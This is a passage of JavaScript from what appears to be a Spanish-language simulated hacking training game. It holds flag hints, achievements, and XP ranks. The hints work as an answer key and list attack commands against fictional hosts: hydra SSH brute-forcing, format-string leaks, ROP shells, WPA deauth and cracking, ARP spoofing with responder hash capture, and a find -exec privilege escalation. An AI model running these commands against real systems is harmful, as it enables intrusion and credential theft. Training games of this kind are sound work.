    'CQ{fmtstr_ssh}': 'hydra -l svc -P /home/guillermo/wordlists/rockyou.txt ssh://formatstr.htb',
    'CQ{fmtstr_str1ngs}': 'recon del binario: strings/checksec/objdump sobre fmt',
    'CQ{fmtstr_l34k}': './fmt %p.%p.%p.%p filtra la pila',
    'CQ{fmtstr_s3cr3t}': './fmt %s lee el secreto del stack (r00t_m4st3r_k3y)',
    'CQ{fmtstr_r00t}': './fmt r00t_m4st3r_k3y activa el modo mantenimiento — flag al final',
    'CQ{r3tl1bc_ssh}': 'hydra -l svc -P /home/guillermo/wordlists/rockyou.txt ssh://retlibc.htb',
    'CQ{r3tl1bc_str1ngs}': 'recon del binario: strings/checksec/objdump sobre retlib',
    'CQ{r3tl1bc_l34k}': 'un payload de 200+ caracteres filtra la dirección de libc (0x7f1234567a30)',
    'CQ{r3tl1bc_r0p}': 'añade 0x7f1234567a30 a tu payload para ejecutar la ROP chain',
    'CQ{r3tl1bc_r00t}': 'la ROP chain spawn de system("/bin/sh") como root — flag al final',
    'CQ{4irg4p_r3c0n}': 'iwconfig y airodump-ng wlan0 para ver las redes',
    'CQ{4irg4p_h4ndsh4k3}': 'airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w captura wlan0 y luego aireplay-ng -0 5 --bssid AA:BB:CC:11:22:33 -c 44:55:66:77:88:99 wlan0',
    'CQ{4irg4p_psk_cr4ck3d}': 'aircrack-ng -w /home/guillermo/wordlists/rockyou.txt captura.cap',
    'CQ{4irg4p_h1dd3n_4p}': 'tras crackear AirGapCorp, vuelve a escanear: aparece la red oculta AirGapGuests',
    'CQ{4irg4p_gu3sts_pwn3d}': 'captura y craquea el handshake de AirGapGuests (BSSID AA:BB:CC:44:55:66, canal 11)',
    'CQ{mshpt_r3c0n}': 'airodump-ng wlan0 — la red MeshPoint-EAP es WPA2-Enterprise (MGT)',
    'CQ{mshpt_e4p_h4ndsh4k3}': 'airodump-ng --bssid 12:34:56:78:9A:BC -c 11 -w cap wlan0 + aireplay-ng -0 5 --bssid 12:34:56:78:9A:BC wlan0',
    'CQ{mshpt_r4d1us_cr4ck3d}': 'asleap -C <challenge> -R <response> con el handshake EAP capturado',
    'CQ{mshpt_ssh}': 'ssh jmartinez@10.10.20.12 con la contraseña crackeada (C4rD1n4l2024!)',
    'CQ{mshpt_r00t}': 'cat flag.txt en /home/jmartinez',
    'CQ{vl4nh0p_gu3st_vl4n}': 'vlanhop — conseguirás el acceso a la VLAN de invitados',
    'CQ{vl4nh0p_1nt3rn4l}': 'vlanhop te muestra los hosts de la red interna (192.168.20.10)',
    'CQ{vl4nh0p_f1l3s3rv3r}': 'hydra -l backup -P /home/guillermo/wordlists/rockyou.txt ssh://192.168.20.10 y conecta',
    'CQ{vl4nh0p_gtf0b1ns}': 'sudo -l y abusa de find con -exec /bin/sh en el host interno',
    'CQ{vl4nh0p_r00t}': 'cat /root/root.txt en 192.168.20.10 tras el GTFOBins',
    'CQ{r0gu3_m1tm_4ct1v3}': 'arpspoof -i eth0 -t 192.168.30.42 192.168.30.1',
    'CQ{r0gu3_ntlmv2_c4ptur3d}': 'con el MITM activo: responder -I eth0',
    'CQ{r0gu3_h4sh_cr4ck3d}': 'hashcat -m 5600 hash.txt /home/guillermo/wordlists/rockyou.txt',
    'CQ{r0gu3_ssh}': 'ssh dhcp_admin@10.10.20.14 con la contraseña crackeada (R0gu3DHCP!)',
    'CQ{r0gu3_r00t}': 'cat flag.txt en /home/dhcp_admin',
  };

  /* ───────────────────────────────────────────────
     METADATOS DE CAJA (para el mapa / selector)
     ─────────────────────────────────────────────── */
  const BOX_ORDER = ['10.10.14.22', '10.10.15.40', '10.10.17.30', '10.10.16.88', '10.10.18.11', '10.10.18.12', '10.10.18.13', '10.10.18.14', '10.10.19.11', '10.10.19.12', '10.10.19.13', '10.10.19.14', '10.10.20.11', '10.10.20.12', '10.10.20.13', '10.10.20.14'];

  /* ── Categorías: agrupan las cajas en el mapa y en "hosts" ── */
  const CATEGORY_ORDER = ['clasica', 'cloud', 'pwn', 'wireless'];
  const CATEGORY_META = {
    clasica: { label: 'Clásicas', icon: '🖥️' },
    cloud: { label: 'Cloud', icon: '☁️' },
    pwn: { label: 'Pwn', icon: '💣' },
    wireless: { label: 'Wireless', icon: '📡' },
  };

  function boxCategory(boxIp) {
    const h = global.HOSTS && global.HOSTS[boxIp];
    return (h && h.category) || 'clasica';
  }

  function flagsForBox(boxIp) {
    return Object.keys(FLAG_REGISTRY).filter((k) => FLAG_REGISTRY[k].box === boxIp);
  }
  function xpTotalForBox(boxIp) {
    return flagsForBox(boxIp).reduce((sum, k) => sum + FLAG_REGISTRY[k].xp, 0);
  }

  /* ───────────────────────────────────────────────
     LOGROS
     ─────────────────────────────────────────────── */
  const ACHIEVEMENTS = [
    { id: 'first_flag', icon: '🚩', name: 'Primera Sangre', desc: 'Captura tu primera flag',
      check: (s) => Object.keys(s.flagsFound || {}).length >= 1 },
    { id: 'first_box', icon: '✅', name: 'Primera Caja', desc: 'Completa una máquina entera',
      check: (s) => BOX_ORDER.some((ip) => isBoxDone(s, ip)) },
    { id: 'all_boxes', icon: '👑', name: 'Red Teamer', desc: `Completa las ${BOX_ORDER.length} máquinas`,
      check: (s) => BOX_ORDER.every((ip) => isBoxDone(s, ip)) },
    { id: 'xp_300', icon: '⚡', name: '300 XP', desc: 'Acumula 300 XP en total',
      check: (s) => s.globalXP >= 300 },
    { id: 'xp_800', icon: '🌟', name: '800 XP', desc: 'Acumula 800 XP en total',
      check: (s) => s.globalXP >= 800 },
    { id: 'xp_1500', icon: '🚀', name: '1.500 XP', desc: 'Acumula 1.500 XP en total',
      check: (s) => s.globalXP >= 1500 },
    { id: 'xp_2400', icon: '☄️', name: '2.400 XP', desc: 'Acumula 2.400 XP en total',
      check: (s) => s.globalXP >= 2400 },
    { id: 'windows_pwn', icon: '🪟', name: 'AD Compromise', desc: 'Completa la máquina Windows/AD',
      check: (s) => isBoxDone(s, '10.10.15.40') },
    { id: 'pivot_master', icon: '🔀', name: 'Pivot Master', desc: 'Completa la máquina más difícil de pivoting',
      check: (s) => isBoxDone(s, '10.10.16.88') },
    { id: 'cloud_breaker', icon: '☁️', name: 'Cloud Breaker', desc: 'Completa una máquina Cloud',
      check: (s) => BOX_ORDER.some((ip) => isBoxDone(s, ip) && boxCategory(ip) === 'cloud') },
    { id: 'binary_breaker', icon: '💣', name: 'Binary Breaker', desc: 'Completa una máquina Pwn',
      check: (s) => BOX_ORDER.some((ip) => isBoxDone(s, ip) && boxCategory(ip) === 'pwn') },
    { id: 'signal_hunter', icon: '📡', name: 'Signal Hunter', desc: 'Completa una máquina Wireless',
      check: (s) => BOX_ORDER.some((ip) => isBoxDone(s, ip) && boxCategory(ip) === 'wireless') },
    { id: 'explorer', icon: '🔍', name: 'Explorador', desc: 'Usa 15 comandos distintos',
      check: (s) => Object.keys(s.commandsUsed || {}).length >= 15 },
    { id: 'no_hints', icon: '🧠', name: 'Sin Ayuda', desc: 'Completa una máquina sin usar pistas',
      check: (s) => BOX_ORDER.some((ip) => isBoxDone(s, ip) && !(s.hintsUsedByBox && s.hintsUsedByBox[ip])) },
    { id: 'curious', icon: '📖', name: 'Curioso', desc: 'Lee 10 archivos distintos en total',
      check: (s) => (s.filesRead || 0) >= 10 },
  ];

  function isBoxDone(state, boxIp) {
    const need = flagsForBox(boxIp);
    if (need.length === 0) return false;
    return need.every((f) => state.flagsFound && state.flagsFound[f]);
  }

  /* ───────────────────────────────────────────────
     RANGOS
     ─────────────────────────────────────────────── */
  const RANKS = [
    { min: 0, max: 150, name: 'Script Kiddie', badge: '🌱' },
    { min: 150, max: 400, name: 'Explorador', badge: '🔍' },
    { min: 400, max: 700, name: 'Operador', badge: '⚡' },
    { min: 700, max: 1000, name: 'Analista Red', badge: '🎯' },
    { min: 1000, max: 1400, name: 'Pentester', badge: '🐍' },
    { min: 1400, max: 1900, name: 'Red Teamer', badge: '🔴' },
    { min: 1900, max: 2500, name: 'Cazador de Bugs', badge: '🧠' },
    { min: 2500, max: Infinity, name: 'Elite Hacker', badge: '👑' },
  ];
  function getRank(xp) {
    for (let i = RANKS.length - 1; i >= 0; i--) if (xp >= RANKS[i].min) return { idx: i, ...RANKS[i] };
    return { idx: 0, ...RANKS[0] };
  }

  global.FLAG_REGISTRY = FLAG_REGISTRY;
  global.FLAG_HINTS = FLAG_HINTS;
  global.BOX_ORDER = BOX_ORDER;
  global.CATEGORY_ORDER = CATEGORY_ORDER;
  global.CATEGORY_META = CATEGORY_META;
  global.boxCategory = boxCategory;
  global.flagsForBox = flagsForBox;
  global.xpTotalForBox = xpTotalForBox;
  global.ACHIEVEMENTS = ACHIEVEMENTS;
  global.isBoxDone = isBoxDone;
  global.RANKS = RANKS;
  global.getRank = getRank;
})(typeof window !== 'undefined' ? window : globalThis);
